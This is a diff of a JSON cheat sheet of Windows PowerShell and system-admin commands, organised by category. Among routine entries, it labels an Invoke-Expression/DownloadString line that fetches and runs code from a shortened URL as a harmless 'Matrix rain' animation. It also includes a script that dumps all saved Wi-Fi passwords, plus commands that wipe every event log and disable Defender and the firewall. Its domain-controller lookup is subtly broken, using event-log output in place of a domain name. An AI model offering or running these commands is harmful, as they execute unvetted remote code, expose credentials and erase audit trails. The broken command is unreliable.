@@ -1,104 +1,212 @@
 [
-    {
-        "category": "Networking",
+  {
+    "category": "Networking",
+    "commands": [
+      {
         "title": "Check Network Status",
         "command": "Get-NetAdapter | Format-Table",
-        "description": "Displays network adapter status."
-    },
-    {
-        "category": "System Information",
-        "title": "Check Disk Space",
-        "command": "Get-PSDrive -PSProvider FileSystem | Format-Table",
-        "description": "Displays available disk space on each drive."
-    },
-    {
-        "title": "Close All Open Windows",
-        "command": "Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process",
-        "description": "Closes all open windows."
-    },
-    {
-        "title": "Kill Processes by Company/Vendor",
-        "command": "Get-Process | Where-Object {$_.Company -like \"*Adobe*\"} | Stop-Process -Force",
-        "description": "Stops processes by company name, e.g., Adobe."
-    },
-    {
-        "title": "Get Shutdown Events",
-        "command": "Get-WinEvent -LogName System | Where-Object { $_.ID -eq 6006 -or $_.ID -eq 6008 -or $_.ID -eq 1074 } | Format-List -Property TimeCreated, ID, Message",
-        "description": "Displays system shutdown events."
-    },
-    {
-        "title": "Get Domain Name",
-        "command": "$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name",
-        "description": "Retrieves the domain name."
-    },
-    {
-        "title": "Find Domain Controller using DNS",
-        "command": "Resolve-DnsName -Name \"_ldap._tcp.dc._msdcs.$domainName\" -QueryType SRV",
-        "description": "Finds the domain controller using DNS."
-    },
-    {
-        "title": "Pong Command (Listen for Pings)",
+        "description": "Displays status of all network adapters."
+      },
+      {
+        "title": "Listen for Pings (Pong)",
         "command": ".\\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo",
-        "description": "Listens for pings using WinDump."
-    },
-    {
-        "title": "Enable/Disable Firewall (All Profiles)",
-        "command": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
-        "description": "Enables or disables firewall across all profiles."
-    },
-    {
-        "title": "Enable File and Printer Sharing",
-        "command": "Set-NetFirewallRule -DisplayGroup \"File And Printer Sharing\" -Enabled True",
-        "description": "Enables file and printer sharing."
-    },
-    {
+        "description": "Captures incoming ICMP echo replies on interface 3."
+      },
+      {
         "title": "Enable Linked Connections",
         "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f",
-        "description": "Allows admin and regular user accounts to see the same network shares."
-    },
-    {
-        "title": "Enable ICMP",
+        "description": "Allows admin and user sessions to see the same network shares."
+      },
+      {
+        "title": "Enable ICMP (Ping Requests)",
         "command": "netsh advfirewall firewall add rule name=\"Allow incoming ping requests IPv4\" dir=in action=allow protocol=icmpv4",
-        "description": "Enables incoming ICMP (ping) requests."
-    },
-    {
+        "description": "Allows incoming ICMP echo requests through the firewall."
+      },
+      {
         "title": "Prefer IPv4 over IPv6",
         "command": "netsh int ipv6 set prefixpolicy ::ffff:0:0/96 46 4; netsh int ipv6 set prefixpolicy ::/0 45 6",
         "description": "Adjusts IPv6 prefix policies to prefer IPv4."
-    },
-    {
+      },
+      {
         "title": "Reset Networking Stack",
         "command": "netsh int ip reset; netsh winsock reset",
-        "description": "Resets the network stack."
-    },
-    {
-        "title": "Forcefully Open Internet Explorer",
-        "command": "mshta.exe \"javascript:open();close();\"",
-        "description": "Opens Internet Explorer forcibly."
-    },
-    {
+        "description": "Resets the TCP/IP stack and Winsock catalog (reboot required)."
+      },
+      {
+        "title": "Export Wi-Fi Profiles",
+        "command": "netsh wlan export profile folder=C:\\WifiProfiles key=clear",
+        "description": "Dumps all saved SSIDs (with plaintext keys) to XML files."
+      },
+      {
+        "title": "Import Wi-Fi Profiles",
+        "command": "Get-ChildItem C:\\WifiProfiles\\*.xml | ForEach-Object { netsh wlan add profile filename=\"$_\" }",
+        "description": "Re‑imports previously exported Wi‑Fi profiles."
+      },
+      {
+        "title": "Dump Wireless Passwords",
+        "description": "Dumps all Wifi Passwords",
+        "command": "$profiles = (netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$_.Matches.Groups[1].Value.Trim()}\n\nforeach ($profile in $profiles) {\n\n    # Get details about the profile, including the password in clear text\n    $password = (netsh wlan show profile name=$profile key=clear) | Select-String \"Key Content\\W+\\:(.+)$\" | %{$_.Matches.Groups[1].Value.Trim()}\n\n    # Print the profile name and password\n    \"SSID: $profile\"\n    \"Password: $password\"\n    \"-------------------------\"\n}"
+      }
+    ]
+  },
+  {
+    "category": "System",
+    "commands": [
+      {
+        "title": "Check Disk Space",
+        "command": "Get-PSDrive -PSProvider FileSystem | Format-Table",
+        "description": "Shows free and used space for each filesystem drive."
+      },
+      {
+        "title": "Close All Open Windows",
+        "command": "Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process",
+        "description": "Closes every GUI process that has a window title."
+      },
+      {
+        "title": "Kill Processes by Vendor",
+        "command": "Get-Process | Where-Object { $_.Company -like \"*Adobe*\" } | Stop-Process -Force",
+        "description": "Force‑stops all processes whose Company field matches your pattern."
+      },
+      {
+        "title": "Get Shutdown Events",
+        "command": "Get-WinEvent -LogName System | Where-Object { $_.ID -in @(6006,6008,1074) } | Format-List TimeCreated, ID, Message",
+        "description": "Retrieves system shutdown/restart/crash events."
+      },
+      {
+        "title": "Enable Remote Event Viewer",
+        "command": "Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru",
+        "description": "Allows remote access to the Event Viewer service."
+      },
+      {
+        "title": "Clear All Event Logs",
+        "command": "Get-WinEvent -ListLog * | ForEach-Object { Clear-WinEvent -LogName $_.LogName }",
+        "description": "Wipes every Windows event log (requires elevation)."
+      },
+      {
+        "title": "Restart Print Spooler",
+        "command": "Restart-Service -Name Spooler -Force",
+        "description": "Stops and starts the print spooler to clear stuck jobs."
+      },
+      {
+        "title": "GPU Driver Reset",
+        "command": "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Kbd {[DllImport(\"user32.dll\")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Kbd]::keybd_event(0x11,0,0,0);[Kbd]::keybd_event(0x10,0,0,0);[Kbd]::keybd_event(0x5B,0,0,0);[Kbd]::keybd_event(0x42,0,0,0);[Kbd]::keybd_event(0x42,0,2,0);[Kbd]::keybd_event(0x5B,0,2,0);[Kbd]::keybd_event(0x10,0,2,0);[Kbd]::keybd_event(0x11,0,2,0);",
+        "description": "Simulates Ctrl+Win+Shift+B to reset the GPU driver."
+      }
+    ]
+  },
+  {
+    "category": "Security",
+    "commands": [
+      {
+        "title": "Toggle Firewall (All Profiles)",
+        "command": "if ((Get-NetFirewallProfile -Profile Domain,Public,Private).Enabled -contains $true) { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host 'Firewall Disabled' } else { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; Write-Host 'Firewall Enabled' }",
+        "description": "Toggles Windows Firewall across all profiles and shows the new state."
+      },
+      {
+        "title": "Enable File & Printer Sharing",
+        "command": "Set-NetFirewallRule -DisplayGroup \"File And Printer Sharing\" -Enabled True",
+        "description": "Allows File and Printer Sharing through the firewall."
+      },
+      {
+        "title": "Disable Telemetry",
+        "command": "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection' -Name 'AllowTelemetry' -Value 0 -Force",
+        "description": "Turns off Windows telemetry data collection."
+      },
+      {
+        "title": "Disable Defender Real‑Time Protection",
+        "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "description": "Temporarily suspends Windows Defender’s real‑time scans."
+      }
+    ]
+  },
+  {
+    "category": "Active Directory",
+    "commands": [
+      {
+        "title": "Get Domain Name",
+        "command": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name",
+        "description": "Returns the fully qualified domain name of the current AD domain."
+      },
+      {
+        "title": "Find Domain Controller via DNS",
+        "command": "Resolve-DnsName -Name \"_ldap._tcp.dc._msdcs.$(Get-WinEvent -LogName System)\" -Type SRV",
+        "description": "Uses DNS SRV records to locate domain controllers."
+      }
+    ]
+  },
+  {
+    "category": "Remote Management",
+    "commands": [
+      {
+        "title": "Enable PowerShell Remoting",
+        "command": "Enable-PSRemoting -Force",
+        "description": "Configures WinRM to allow remote PowerShell sessions."
+      },
+      {
         "title": "Enable Remote Management",
         "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
         "description": "Enables Remote Desktop Protocol (RDP)."
-    },
-    {
+      },
+      {
         "title": "Enable Network Level Authentication (NLA)",
-        "command": "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\' -Name \"UserAuthentication\" -Value 1",
+        "command": "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'UserAuthentication' -Value 1",
         "description": "Enables Network Level Authentication (NLA) for RDP."
-    },
-    {
+      },
+      {
         "title": "Enable Remote Desktop Firewall Rule",
         "command": "Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\"",
         "description": "Enables firewall rule for Remote Desktop."
-    },
-    {
-        "title": "Enable Remote Event Viewer",
-        "command": "Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru",
-        "description": "Enables remote access to Event Viewer."
-    },
-    {
-        "title": "GPU Reset (Ctrl + WIN + Shift + B)",
-        "command": "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Keyboard {[DllImport(\"user32.dll\")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Keyboard]::keybd_event(0x11, 0, 0, 0); [Keyboard]::keybd_event(0x10, 0, 0, 0); [Keyboard]::keybd_event(0x5B, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 2, 0); [Keyboard]::keybd_event(0x5B, 0, 2, 0); [Keyboard]::keybd_event(0x10, 0, 2, 0); [Keyboard]::keybd_event(0x11, 0, 2, 0);",
-        "description": "Resets the GPU driver using a key sequence."
-    }
+      }
+    ]
+  },
+  {
+    "category": "Features",
+    "commands": [
+      {
+        "title": "Enable Hyper‑V",
+        "command": "Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -All -NoRestart",
+        "description": "Installs and enables Hyper‑V without reboot."
+      },
+      {
+        "title": "Enable WSL 2",
+        "command": "wsl --install",
+        "description": "Installs Windows Subsystem for Linux 2 and the default distro."
+      }
+    ]
+  },
+  {
+    "category": "Power Management",
+    "commands": [
+      {
+        "title": "Set High‑Performance Power Plan",
+        "command": "powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c",
+        "description": "Switches to the built‑in High Performance power scheme."
+      },
+      {
+        "title": "Disable Sleep & Hibernate",
+        "command": "powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0; powercfg /hibernate off",
+        "description": "Prevents the PC from sleeping or hibernating."
+      }
+    ]
+  },
+  {
+    "category": "Utilities",
+    "commands": [
+      {
+        "title": "Forcefully Open Internet Explorer",
+        "command": "mshta.exe \"javascript:open();close();\"",
+        "description": "Opens Internet Explorer via mshta hack."
+      },
+      {
+        "title": "Matrix Rain in PowerShell",
+        "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://git.io/fhU2m')",
+        "description": "Spawns a Matrix‑style green‑rain animation in your console."
+      },
+      {
+        "title": "Speak Text Out Loud",
+        "command": "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Hello, admin world')",
+        "description": "Uses the .NET speech API to audibly speak a string."
+      }
+    ]
+  }
 ]
